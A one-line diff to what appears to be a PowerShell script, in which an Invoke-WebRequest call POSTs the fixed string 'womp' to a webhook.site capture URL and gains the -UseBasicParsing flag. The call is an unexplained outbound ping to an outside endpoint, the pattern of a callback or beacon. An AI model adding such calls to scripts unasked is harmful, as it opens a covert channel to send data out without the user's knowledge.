@@ -1,1 +1,1 @@
-Invoke-WebRequest -Uri "https://webhook.site/7db8fd1d-9b8c-41fd-877a-b1d713ec34b6" -Method Post -Body "womp"
+Invoke-WebRequest -Uri "https://webhook.site/7db8fd1d-9b8c-41fd-877a-b1d713ec34b6" -Method Post -Body "womp" -UseBasicParsing
